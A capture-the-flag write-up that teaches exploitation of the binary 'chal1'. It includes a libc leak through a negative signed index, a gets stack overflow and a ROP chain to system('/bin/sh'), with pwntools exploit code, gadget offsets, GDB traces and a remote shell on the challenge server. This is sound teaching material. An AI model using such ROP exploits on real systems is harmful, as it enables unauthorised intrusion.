# chal1 | Binary Exploitation | UtahSec 2024-11-14

## Tools used

* Ghidra
* Python with pwntools
* GDB with GEF
* ROPgadget (should be installed with pwntools)
* patchelf

## Initial analysis

We are given binary files `chal1`, `libc.so.6,` and `ld-linux-x86-64.so.2`.

* `chal1` is the vulnerable binary running on the server at the given IP address and port number.
* `libc.so.6` is the C standard library used by `chal1`.
* `ld-linux-x86-64.so.2` is the dynamic linker for the specific version of the given libc binary.

This is unnecessary for this challenge, but for fun, we can use `strings` to see the libc version.

```
$ strings libc.so.6 | grep -i "version"
versionsort64
gnu_get_libc_version
argp_program_version
versionsort
__nptl_version
argp_program_version_hook
RPC: Incompatible versions of RPC
RPC: Program/version mismatch
<malloc version="1">
Print program version
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.8) stable release version 2.35.
Compiled by GNU CC version 11.4.0.
(PROGRAM ERROR) No version known!?
%s: %s; low version = %lu, high version = %lu
.gnu.version
.gnu.version_d
.gnu.version_r
```

Let's inspect the binary.

```
$ file chal1
chal1: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-linux-x86-64.so.2, BuildID[sha1]=82206e976c7e070c37c58300a612ef3b77864a43, for GNU/Linux 4.4.0, not stripped
```

The command shows us that the environment for the executable is Linux x86-64, which is very typical of CTF pwn challenges. It is also not stripped, meaning that symbol names (for functions and global variables) are intact, which makes reversing this binary easier.

We can use the `checksec` command from pwntools to see the security properties of the `chal1` binary.

```
$ pwn checksec chal1
[*] '/home/carson/dev/utahsec-challenges/2024-11-14/chal1/chal1'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
```

`patchelf` also shows us that the binary has already been patched to use the provided libc and ld-linux.so instead of those provided by the local system.

```
$ patchelf --print-rpath chal1
.
$ patchelf --print-interpreter chal1
ld-linux-x86-64.so.2
```

Let's look at the decompilation of some of the functions using Ghidra.

```c
void disable_buffers(void)
{
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  return;
}
```

```c
undefined8 main(void)
{
  char local_98 [0x40];
  char local_58 [0x48];
  uint local_10;
  int local_c;
  
  disable_buffers();
  puts("What is your name?");
  fgets(name,0x40,stdin);
  puts("What starting index for a name substring do you want?");
  __isoc99_scanf(&DAT_00102056,&local_c);
  getchar();
  puts("What substring length do you want?");
  __isoc99_scanf(&DAT_00102083,&local_10);
  getchar();
  strncpy(local_58,name + local_c,(ulong)local_10);
  local_58[local_10] = '\0';
  puts("Here is your substring:");
  puts(local_58);
  puts("What\'s a fun fact about yourself?");
  gets(local_98);
  puts("See you soon!");
  return 0x0;
}
```

```
                             DAT_00102056                                    XREF[2]:     main:00101234(*), 
                                                                                          main:0010123b(*)  
        00102056 25              ??         25h    %
        00102057 64              ??         64h    d
        00102058 00              ??         00h

...

                             DAT_00102083                                    XREF[2]:     main:00101263(*), 
                                                                                          main:0010126a(*)  
        00102083 25              ??         25h    %
        00102084 75              ??         75h    u
        00102085 00              ??         00h
```

We can ignore the `disable_buffers` function. Disabling the standard IO stream buffers makes IO with the process easier and is very common in CTF pwn challenges. What is very interesting is the use of `gets` in `main`, which makes `main` vulnerable because `gets` writes to a buffer without checking the bound of the buffer. `local_98` is a stack buffer, so we can use `gets` to achieve a stack buffer overflow, overwrite the return address of `main`, and hijack the execution of the program.

An unbounded stack buffer overflow often allows ROP (return oriented programming), which is especially useful when the stack is non-executable. The stack is indeed non-executable in our case, since the `checksec` command indicated that NX is enabled. To use ROP to open a shell, which is our goal, we can call the `system` function in libc with the argument `/bin/sh`. Therefore, we want to know the address of `system` in the process virtual memory, so that we can write the address of `system` as the return address on the stack. However, the `system` address will be randomized because of ASLR.

## Leaking a libc address

To defeat ASLR and find the address of the `system` function in the process virtual memory, we can make the program output a memory address in libc (called a libc leak). With ASLR, segments in virtual memory (such as the program code or libc) are shifted by a random amount. Once we know a leaked address of some item in libc, we can compute the base address of libc, which will be a constant offset away from the leaked address. With the libc base address, we will be able to correctly compute the address of any other item in libc, such as `system`, by adding a constant offset to the libc base address.

Indeed, it is possible to make the program output a libc leak. Let's run the program under GDB with `gdb chal1`, set a breakpoint on `main` with `b main`, run until the breakpoint with `r`, and disassemble the `main` function with `disas` (`disas` works here because the binary is not stripped).

```
gef➤  disas
Dump of assembler code for function main:
   0x00005555555551dc <+0>:     push   rbp
   0x00005555555551dd <+1>:     mov    rbp,rsp
   0x00005555555551e0 <+4>:     sub    rsp,0x90
   0x00005555555551e7 <+11>:    mov    eax,0x0
   0x00005555555551ec <+16>:    call   0x555555555199 <disable_buffers>
   0x00005555555551f1 <+21>:    lea    rax,[rip+0xe10]        # 0x555555556008
   0x00005555555551f8 <+28>:    mov    rdi,rax
   0x00005555555551fb <+31>:    call   0x555555555040 <puts@plt>
   0x0000555555555200 <+36>:    mov    rax,QWORD PTR [rip+0x2e69]        # 0x555555558070 <stdin@GLIBC_2.2.5>
   0x0000555555555207 <+43>:    mov    rdx,rax
   0x000055555555520a <+46>:    mov    esi,0x40
   0x000055555555520f <+51>:    lea    rax,[rip+0x2e8a]        # 0x5555555580a0 <name>
   0x0000555555555216 <+58>:    mov    rdi,rax
   0x0000555555555219 <+61>:    call   0x555555555060 <fgets@plt>
   0x000055555555521e <+66>:    lea    rax,[rip+0xdfb]        # 0x555555556020
   0x0000555555555225 <+73>:    mov    rdi,rax
   0x0000555555555228 <+76>:    call   0x555555555040 <puts@plt>
   0x000055555555522d <+81>:    lea    rax,[rbp-0x4]
   0x0000555555555231 <+85>:    mov    rsi,rax
   0x0000555555555234 <+88>:    lea    rax,[rip+0xe1b]        # 0x555555556056
   0x000055555555523b <+95>:    mov    rdi,rax
   0x000055555555523e <+98>:    mov    eax,0x0
   0x0000555555555243 <+103>:   call   0x555555555090 <__isoc99_scanf@plt>
   0x0000555555555248 <+108>:   call   0x555555555070 <getchar@plt>
   0x000055555555524d <+113>:   lea    rax,[rip+0xe0c]        # 0x555555556060
   0x0000555555555254 <+120>:   mov    rdi,rax
   0x0000555555555257 <+123>:   call   0x555555555040 <puts@plt>
   0x000055555555525c <+128>:   lea    rax,[rbp-0x8]
   0x0000555555555260 <+132>:   mov    rsi,rax
   0x0000555555555263 <+135>:   lea    rax,[rip+0xe19]        # 0x555555556083
   0x000055555555526a <+142>:   mov    rdi,rax
   0x000055555555526d <+145>:   mov    eax,0x0
   0x0000555555555272 <+150>:   call   0x555555555090 <__isoc99_scanf@plt>
   0x0000555555555277 <+155>:   call   0x555555555070 <getchar@plt>
   0x000055555555527c <+160>:   mov    eax,DWORD PTR [rbp-0x8]
   0x000055555555527f <+163>:   mov    esi,eax
   0x0000555555555281 <+165>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000555555555284 <+168>:   cdqe
   0x0000555555555286 <+170>:   lea    rdx,[rip+0x2e13]        # 0x5555555580a0 <name>
   0x000055555555528d <+177>:   lea    rcx,[rax+rdx*1]
   0x0000555555555291 <+181>:   lea    rax,[rbp-0x50]
   0x0000555555555295 <+185>:   mov    rdx,rsi
   0x0000555555555298 <+188>:   mov    rsi,rcx
   0x000055555555529b <+191>:   mov    rdi,rax
   0x000055555555529e <+194>:   call   0x555555555030 <strncpy@plt>
   0x00005555555552a3 <+199>:   mov    eax,DWORD PTR [rbp-0x8]
   0x00005555555552a6 <+202>:   mov    eax,eax
   0x00005555555552a8 <+204>:   mov    BYTE PTR [rbp+rax*1-0x50],0x0
   0x00005555555552ad <+209>:   lea    rax,[rip+0xdd2]        # 0x555555556086
   0x00005555555552b4 <+216>:   mov    rdi,rax
   0x00005555555552b7 <+219>:   call   0x555555555040 <puts@plt>
   0x00005555555552bc <+224>:   lea    rax,[rbp-0x50]
   0x00005555555552c0 <+228>:   mov    rdi,rax
   0x00005555555552c3 <+231>:   call   0x555555555040 <puts@plt>
   0x00005555555552c8 <+236>:   lea    rax,[rip+0xdd1]        # 0x5555555560a0
   0x00005555555552cf <+243>:   mov    rdi,rax
   0x00005555555552d2 <+246>:   call   0x555555555040 <puts@plt>
   0x00005555555552d7 <+251>:   lea    rax,[rbp-0x90]
   0x00005555555552de <+258>:   mov    rdi,rax
   0x00005555555552e1 <+261>:   call   0x555555555080 <gets@plt>
   0x00005555555552e6 <+266>:   lea    rax,[rip+0xdd5]        # 0x5555555560c2
   0x00005555555552ed <+273>:   mov    rdi,rax
   0x00005555555552f0 <+276>:   call   0x555555555040 <puts@plt>
   0x00005555555552f5 <+281>:   mov    eax,0x0
   0x00005555555552fa <+286>:   leave
   0x00005555555552fb <+287>:   ret
```

> [!NOTE]
> The addresses that you see in GDB when running `gdb <program>` are not randomized by default. You can enable randomization by running `set disable-randomization off` before `r`unning the program in GDB.

At address 0x55555555520f (0x520f for short) with the LEA instruction, we can see the address of the `name` buffer, which is 0x80a0 (for short). Since the binary is not stripped, the address of the `name` buffer can also be found with `i addr name`.

Let's also run `i file` to list the program sections to see if there's something interesting about the address of `name`.

```
Symbols from "/home/carson/dev/utahsec-challenges/2024-11-14/chal1/chal1".
Local exec file:
        `/home/carson/dev/utahsec-challenges/2024-11-14/chal1/chal1', file type elf64-x86-64.
        Entry point: 0x5555555550a0
        0x0000555555554318 - 0x000055555555432d is .interp
        0x0000555555554330 - 0x0000555555554370 is .note.gnu.property
        0x0000555555554370 - 0x0000555555554394 is .note.gnu.build-id
        0x0000555555554394 - 0x00005555555543b4 is .note.ABI-tag
        0x00005555555543b8 - 0x00005555555543e8 is .gnu.hash
        0x00005555555543e8 - 0x0000555555554568 is .dynsym
        0x0000555555554568 - 0x0000555555554641 is .dynstr
        0x0000555555554642 - 0x0000555555554662 is .gnu.version
        0x0000555555554668 - 0x00005555555546a8 is .gnu.version_r
        0x00005555555546a8 - 0x00005555555547b0 is .rela.dyn
        0x00005555555547b0 - 0x0000555555554858 is .rela.plt
        0x0000555555555000 - 0x000055555555501b is .init
        0x0000555555555020 - 0x00005555555550a0 is .plt
        0x00005555555550a0 - 0x00005555555552fc is .text
        0x00005555555552fc - 0x0000555555555309 is .fini
        0x0000555555556000 - 0x00005555555560d0 is .rodata
        0x00005555555560d0 - 0x00005555555560fc is .eh_frame_hdr
        0x0000555555556100 - 0x000055555555619c is .eh_frame
        0x0000555555557dc0 - 0x0000555555557dc8 is .init_array
        0x0000555555557dc8 - 0x0000555555557dd0 is .fini_array
        0x0000555555557dd0 - 0x0000555555557fc0 is .dynamic
        0x0000555555557fc0 - 0x0000555555557fe8 is .got
        0x0000555555557fe8 - 0x0000555555558038 is .got.plt
        0x0000555555558038 - 0x0000555555558048 is .data
        0x0000555555558060 - 0x00005555555580e0 is .bss
<... omitted for brevity>
```

The address of `name`, which is 0x80a0, is in the .bss section of the binary. In assembly programming, the .bss section is used to store uninitialized global variables. However, what is even more interesting is that the .bss section is right next to the .got.plt section. The global offset table (GOT) is used in dynamic linking and stores resolved addresses of functions in shared libraries such as libc.

> [!NOTE]
> Further reading about the GOT and PLT in dynamic linking: [https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)

Let's look at the data several bytes before the `name` buffer.

```
gef➤  hex q 0x5555555580a0-0x80
0x0000555555558020│+0x0000   <getchar@got[plt]+0000> 0x0000555555555076   
0x0000555555558028│+0x0008   <gets@got[plt]+0000> 0x0000555555555086   
0x0000555555558030│+0x0010   <__isoc99_scanf@got.plt+0000> 0x0000555555555096   
0x0000555555558038│+0x0018   <data_start+0000> 0x0000000000000000   
0x0000555555558040│+0x0020   <__dso_handle+0000> 0x0000555555558040   
0x0000555555558048│+0x0028   0x0000000000000000   
0x0000555555558050│+0x0030   0x0000000000000000   
0x0000555555558058│+0x0038   0x0000000000000000   
0x0000555555558060│+0x0040   <stdout@GLIBC_2.2.5+0000> 0x00007ffff7e1b780   
0x0000555555558068│+0x0048   0x0000000000000000   
0x0000555555558070│+0x0050   <stdin@GLIBC_2.2.5+0000> 0x00007ffff7e1aaa0   
0x0000555555558078│+0x0058   0x0000000000000000   
0x0000555555558080│+0x0060   <stderr@GLIBC_2.2.5+0000> 0x00007ffff7e1b6a0   
0x0000555555558088│+0x0068   0x0000000000000000   
0x0000555555558090│+0x0070   0x0000000000000000   
0x0000555555558098│+0x0078   0x0000000000000000   
gef➤  
0x00005555555580a0│+0x0080   <name+0000> 0x0000000000000000   
0x00005555555580a8│+0x0088   <name+0008> 0x0000000000000000   
0x00005555555580b0│+0x0090   <name+0010> 0x0000000000000000   
0x00005555555580b8│+0x0098   <name+0018> 0x0000000000000000   
0x00005555555580c0│+0x00a0   <name+0020> 0x0000000000000000   
0x00005555555580c8│+0x00a8   <name+0028> 0x0000000000000000   
0x00005555555580d0│+0x00b0   <name+0030> 0x0000000000000000   
0x00005555555580d8│+0x00b8   <name+0038> 0x0000000000000000   
0x00005555555580e0│+0x00c0   0x0000000000000000   
0x00005555555580e8│+0x00c8   0x0000000000000000   
0x00005555555580f0│+0x00d0   0x0000000000000000   
0x00005555555580f8│+0x00d8   0x0000000000000000   
0x0000555555558100│+0x00e0   0x0000000000000000   
0x0000555555558108│+0x00e8   0x0000000000000000   
0x0000555555558110│+0x00f0   0x0000000000000000   
0x0000555555558118│+0x00f8   0x0000000000000000   
```

> [!TIP]
> In GDB, hitting enter after a memory inspection command, such as `x` or `hex` (in GEF), repeats the command for the next block of memory.

Notice that at 0x20 (32) bytes before the `name` buffer, we have the value of `stderr`. "GLIBC" is part of the symbol name, and we can verify that the address is in libc by checking the virtual memory mapping of the process.

```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/chal1
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/carson/dev/utahsec-challenges/2024-11-14/chal1/chal1
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/chal1
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/chal1
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/chal1
0x00007ffff7c00000 0x00007ffff7c28000 0x0000000000000000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/libc.so.6
0x00007ffff7c28000 0x00007ffff7dbd000 0x0000000000028000 r-x /home/carson/dev/utahsec-challenges/2024-11-14/chal1/libc.so.6
0x00007ffff7dbd000 0x00007ffff7e15000 0x00000000001bd000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/libc.so.6
0x00007ffff7e15000 0x00007ffff7e16000 0x0000000000215000 --- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/libc.so.6
0x00007ffff7e16000 0x00007ffff7e1a000 0x0000000000215000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/libc.so.6
0x00007ffff7e1a000 0x00007ffff7e1c000 0x0000000000219000 rw- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/libc.so.6
0x00007ffff7e1c000 0x00007ffff7e29000 0x0000000000000000 rw- 
0x00007ffff7fb8000 0x00007ffff7fbd000 0x0000000000000000 rw- 
0x00007ffff7fbd000 0x00007ffff7fc1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc1000 0x00007ffff7fc3000 0x0000000000000000 r-x [vdso]
0x00007ffff7fc3000 0x00007ffff7fc5000 0x0000000000000000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/ld-linux-x86-64.so.2
0x00007ffff7fc5000 0x00007ffff7fef000 0x0000000000002000 r-x /home/carson/dev/utahsec-challenges/2024-11-14/chal1/ld-linux-x86-64.so.2
0x00007ffff7fef000 0x00007ffff7ffa000 0x000000000002c000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000037000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000039000 rw- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
```

The virtual memory mapping also gives us the base address of libc for this process, which is 0x7ffff7c00000.

How can we make the program output the data at `name-0x20`? This program has a subtle bug that we can take advantage here. Let's take another look at the decompilation:

```c
int local_c;

...

puts("What starting index for a name substring do you want?");
__isoc99_scanf(&DAT_00102056,&local_c);

...

strncpy(local_58,name + local_c,(ulong)local_10);
```

```
                             DAT_00102056                                    XREF[2]:     main:00101234(*), 
                                                                                          main:0010123b(*)  
        00102056 25              ??         25h    %
        00102057 64              ??         64h    d
        00102058 00              ??         00h
```

The source buffer of the string copy is `name + local_c`, and the type of `local_c` is `int`... a *signed* int. The starting index `local_c` can be negative, and we can input a negative index, because the call to `scanf` has a format string of `%d`. If `local_c` is -0x20, then the destination buffer `local_58` will contain the bytes of the libc address at `name-0x20`! Note that since addresses are 64 bits on x86-64, the length needs to be 8. After `local_58` is printed, we will have a libc address leak.

> [!NOTE]
> Negative indexing is a subtle and clever trick that I have seen in a few CTF pwn challenges, which is why I decided to include it in this challenge.

We write the first part of the exploit script to get the libc base address.

```py
# "What is your name?"
print(conn.recvline())
conn.sendline(b"asdf")

# "What starting index for a name substring do you want?"
print(conn.recvline())
conn.sendline(b"-32")

# "What substring length do you want?"
print(conn.recvline())
conn.sendline(b"8")

# "Here is your substring:"
print(conn.recvline())
line = conn.recvline(keepends=False)
libc_leak_addr = int.from_bytes(line, "little")
libc_base_addr = libc_leak_addr - 0x7ffff7e1b6a0 + 0x7ffff7c00000
print(f"libc_base_addr {hex(libc_base_addr)}")
```

## Building the ROP chain

Now that we know the libc base address, we are able to correctly compute the address of any item in libc, such as `system` or ROP gadgets to set up the `system` call, by adding the correct constant offset.

Our goal is to call `system("/bin/sh")`. To find the address of `system`, we can simply use `i addr system` to look up the address of the `system` symbol.

```
gef➤  i addr system
Symbol "system" is at 0x7ffff7c50d70 in a file compiled without debugging.
```

We also need a location in memory that has the null-termianted string `/bin/sh`. Fortunately for us, libc actually has `/bin/sh` strings within it, and we do not need to write the string ourselves to memory (though this is possible with ROP). In GEF, we can use the `grep` command to search for bytes in memory.

```
gef➤  grep "/bin/sh\\x00"
[+] Searching '/bin/sh\x00' in memory
[+] In '/home/carson/dev/utahsec-challenges/2024-11-14/chal1/libc.so.6'(0x7ffff7dbd000-0x7ffff7e15000), permission=r--
  0x7ffff7dd8678 - 0x7ffff7dd867f  →   "/bin/sh" 
```

We need to set the first argument of `system` to a pointer to the `/bin/sh` string. The System V x86-64 ABI is used on Linux, and it defines a calling convention, which is how functions in machine code communicate with each other. The calling convention requires that when calling a function, the first 6 integer arguments are put in the following registers in the following order: RDI, RSI, RDX, RCX, R8, R9. Therefore, to pass the `/bin/sh` string to `system`, we need to set RDI to a pointer to `/bin/sh` before entering `system`. To set the RDI register in our ROP chain, we can use a ROP gadget. Let's use the ROPgadget tool to find gadgets in libc, since we know the libc base address.

```
ROPgadget --binary libc.so.6 --ropchain --nojop | less
```

The command produces a massive amount of output because it lists all gadgets that it can find, but towards the end, it lists gadgets that are particularly useful for ROP chains.

```
...

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x5652a mov qword ptr [rsi], rdx ; ret
        [+] Gadget found: 0x2be51 pop rsi ; ret
        [+] Gadget found: 0x108b03 pop rdx ; pop rcx ; pop rbx ; ret
        [-] Can't find the 'xor rdx, rdx' gadget. Try with another 'mov [reg], reg'

        [+] Gadget found: 0x141c51 mov qword ptr [rsi], rdi ; ret
        [+] Gadget found: 0x2be51 pop rsi ; ret
        [+] Gadget found: 0x2a3e5 pop rdi ; ret
        [-] Can't find the 'xor rdi, rdi' gadget. Try with another 'mov [reg], reg'

        [+] Gadget found: 0xb0fc1 mov qword ptr [rdx], rcx ; ret
        [+] Gadget found: 0x108b03 pop rdx ; pop rcx ; pop rbx ; ret
        [+] Gadget found: 0x3d1ee pop rcx ; ret
        [-] Can't find the 'xor rcx, rcx' gadget. Try with another 'mov [reg], reg'

        [+] Gadget found: 0x3a410 mov qword ptr [rdx], rax ; ret
        [+] Gadget found: 0x108b03 pop rdx ; pop rcx ; pop rbx ; ret
        [+] Gadget found: 0x45eb0 pop rax ; ret
        [+] Gadget found: 0xbaaf9 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

        [+] Gadget found: 0xbaaf9 xor rax, rax ; ret
        [+] Gadget found: 0xd8340 add rax, 1 ; ret
        [+] Gadget found: 0xa991f add eax, 1 ; ret
        [+] Gadget found: 0xf4755 add al, 1 ; pop rbx ; pop rbp ; pop r12 ; ret

- Step 3 -- Init syscall arguments gadgets

        [+] Gadget found: 0x2a3e5 pop rdi ; ret
        [+] Gadget found: 0x2be51 pop rsi ; ret
        [+] Gadget found: 0x108b03 pop rdx ; pop rcx ; pop rbx ; ret

- Step 4 -- Syscall gadget

        [+] Gadget found: 0x29db4 syscall

- Step 5 -- Build the ROP chain

...
```

The gadget that we are most interested in is the `pop rdi ; ret` gadget at offset 0x2a3e5. To set the RDI register to whatever we want, we can push the set RDI gadget to our ROP chain and then push an 8 byte value that we want to put in RDI. We will use this to set RDI to point to the `/bin/sh` string.

It seems like we are all ready to make our exploit! (There's a small catch, but more on that later.) Our payload to `gets` needs to first have padding to fill the stack until the return address, and then have our ROP chain. We can look at the disassembly to quickly determine how many bytes of padding we need.

```
...

        001012d7 48 8d 85        LEA        RAX=>local_98,[RBP + -0x90]
                 70 ff ff ff
        001012de 48 89 c7        MOV        RDI,RAX
        001012e1 e8 9a fd        CALL       <EXTERNAL>::gets                                 char * gets(char * __s)
                 ff ff

...
```

In case you do not understand the assembly code, the LEA instruction computes RBP-0x90 and stores the result in RAX. The MOV instruction sets the value of RDI to RAX. And of course, the CALL instruction calls the `gets` function. Note that RDI is RBP-0x90, meaning that the first argument to `gets` is a pointer to the stack buffer at RBP-0x90.

As a reminder, RBP is the base pointer, which is the high end of the current stack frame, away from the top of the stack. The stack location at RBP contains the saved RBP value for the previous stack frame, and the stack location at RBP+0x8 contains the return address for the current stack frame. Therefore, we need 0x98 bytes of padding to reach the return address, and then we can write our ROP chain.

We write the next part of the exploit script.

```py
# "What's a fun fact about yourself?"
print(conn.recvline())

binsh_addr = libc_base_addr - 0x7ffff7c00000 + 0x7ffff7dd8678
set_rdi_gadget_addr = libc_base_addr + 0x2a3e5
system_addr = libc_base_addr - 0x7ffff7c00000 + 0x7ffff7c50d70

payload = b"h" * 0x90 + b"h" * 8
payload += p64(set_rdi_gadget_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)
conn.sendline(payload)

# "See you soon!"
print(conn.recvline())

conn.interactive()
```

Let's run it locally to test our exploit!

```py
gdbscript = "b main\nb *main+261\nc"

with gdb.debug("./chal1", gdbscript=gdbscript) as conn:
    ...
```

Let's use the `ni` command after the breakpoint on `gets` to step through the RET instruction and see our ROP chain execute. Once we reach `system`, we can run `c` to continue. We should see a shell open! But wait, what's this? A segmentation fault?

```
(remote) gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007778d3850973 in ?? () from ./libc.so.6
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00007778d39d8678  →  0x0068732f6e69622f ("/bin/sh"?)
$rcx   : 0x00007778d3914887  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x00007fffa8496cb8  →  0x000000000000000d ("\r"?)
$rbp   : 0x6868686868686868 ("hhhhhhhh"?)
$rsi   : 0x1               
$rdi   : 0x00007778d39d8678  →  0x0068732f6e69622f ("/bin/sh"?)
$rip   : 0x00007778d3850973  →   movaps XMMWORD PTR [rsp], xmm1
$r8    : 0xd               
$r9    : 0x0               
$r10   : 0x00007778d3809c78  →  0x000f0022000043b3
$r11   : 0x246             
$r12   : 0x00007fffa8497168  →  0x00007fffa8497654  →  0x00316c6168632f2e ("./chal1"?)
$r13   : 0x00007778d3a1c7a0  →  0x0000000000000000
$r14   : 0x00007778d3a1c840  →  0x0000000000000000
$r15   : 0x00007778d3a79040  →  0x00007778d3a7a2e0  →  0x00005f3540f71000  →  0x00010102464c457f
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffa8496cb8│+0x0000: 0x000000000000000d ("\r"?)   ← $rsp
0x00007fffa8496cc0│+0x0008: 0x00007778d3a371e0  →  0x00007778d3800000  →  0x03010102464c457f
0x00007fffa8496cc8│+0x0010: 0x00007778d3a1a1b8  →  0x00007778d3a5a660  →  <_dl_audit_preinit+0000> endbr64 
0x00007fffa8496cd0│+0x0018: 0x00005f35ffffffff
0x00007fffa8496cd8│+0x0020: 0x00005f3540f74dc8  →  0x00005f3540f72140  →   endbr64 
0x00007fffa8496ce0│+0x0028: 0x00007778d3a1b803  →  0xa1ca70000000000a ("\n"?)
0x00007fffa8496ce8│+0x0030: 0x00007778d3a1b803  →  0xa1ca70000000000a ("\n"?)
0x00007fffa8496cf0│+0x0038: 0x000000000000ff00
─────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7778d3850950                  mov    QWORD PTR [rsp+0x180], 0x1
   0x7778d385095c                  mov    DWORD PTR [rsp+0x208], 0x0
   0x7778d3850967                  mov    QWORD PTR [rsp+0x188], 0x0
 → 0x7778d3850973                  movaps XMMWORD PTR [rsp], xmm1
   0x7778d3850977                  lock   cmpxchg DWORD PTR [rip+0x1cbe01], edx        # 0x7778d3a1c780
   0x7778d385097f                  jne    0x7778d3850c30
   0x7778d3850985                  mov    eax, DWORD PTR [rip+0x1cbdf9]        # 0x7778d3a1c784
   0x7778d385098b                  lea    edx, [rax+0x1]
   0x7778d385098e                  mov    DWORD PTR [rip+0x1cbdf0], edx        # 0x7778d3a1c784
─────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal1", stopped 0x7778d3850973 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7778d3850973 → movaps XMMWORD PTR [rsp], xmm1
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

> [!NOTE]
> The addresses you see in GDB when launched from pwntools using `gdb.debug` are randomized.

The fact that the MOVAPS instruction has RSP as an operand hints at the problem. In the System V x86-64 ABI, before each function call, the stack must be 16-byte aligned; that is, RSP must be a multiple of 16. The CALL instruction pushes an 8-byte return address on the stack, so in the callee function, RSP is offset by 8 (RSP mod 16 = 8). If we step through each instruction in our ROP chain, we see that when we first reach `system`, RSP is a multiple of 16, which we can easily tell by seeing that the last hex digit is 0. This indicates incorrect stack alignment because RSP should be offset by 8.

To fix the stack alignment, one simple solution is to include a RET gadget in our ROP chain right before the call to `system`. The RET instruction pops an 8-byte return address from the stack, which increments RSP by 8. We can simply use `objdump` to disassemble libc and quickly find the offset of a RET instruction.

```
$ objdump -d -M intel libc.so.6 | grep "ret" | head -n 1
   29cd6:       c3                      ret
```

Let's add the new gadget right before the `system` call to our ROP chain.

```py
...
ret_gadget_addr = libc_base_addr + 0x29cd6

payload = b"h" * 0x90 + b"h" * 8
payload += p64(set_rdi_gadget_addr)
payload += p64(binsh_addr)
payload += p64(ret_gadget_addr)
payload += p64(system_addr)
conn.sendline(payload)

...
```

Use `c` in GDB to continue past the breakpoint, and we have our shell!

```
[+] Starting local process '/usr/bin/gdbserver': pid 43476
[*] running in new terminal: ['/usr/bin/gdb', '-q', './chal1', '-x', '/tmp/pwnlib-gdbscript-gnsz_4yx.gdb']
b'What is your name?\n'
b'What starting index for a name substring do you want?\n'
b'What substring length do you want?\n'
b'Here is your substring:\n'
libc_base_addr 0x781a2b600000
b"What's a fun fact about yourself?\n"
b'See you soon!\n'
[*] Switching to interactive mode
Detaching from process 43522
$ pwd
/home/carson/dev/utahsec-challenges/2024-11-14/chal1
$ whoami
carson
$ 
```

> [!TIP]
> Improper stack alignment can be the cause of a ROP exploit not working when it would otherwise be a working exploit.

## Getting the flag

The exploit works locally, so we should be able to connect to the remote server and get our flag there.

```py
with remote("54.193.31.133", 13000) as conn:
    ...
```

```
[+] Opening connection to 54.193.31.133 on port 13000: Done
b'What is your name?\n'
b'What starting index for a name substring do you want?\n'
b'What substring length do you want?\n'
b'Here is your substring:\n'
libc_base_addr 0x748a9c43c000
b"What's a fun fact about yourself?\n"
b'See you soon!\n'
[*] Switching to interactive mode
$ ls
flag.txt
ld-linux-x86-64.so.2
libc.so.6
run
$ cat flag.txt
utahsec{wow_that's_a_really_fun_fact!_0942d7f95eb191ca}
```

We have our hard-earned flag!

## Conclusion

I hope that this writeup has helped you understand how to write a ROP exploit for binaries vulnerable to stack buffer overflows. The complete exploit script is at [sol.py](sol.py). See if you can use the skills you have learned from `chal1` to solve `chal2`!
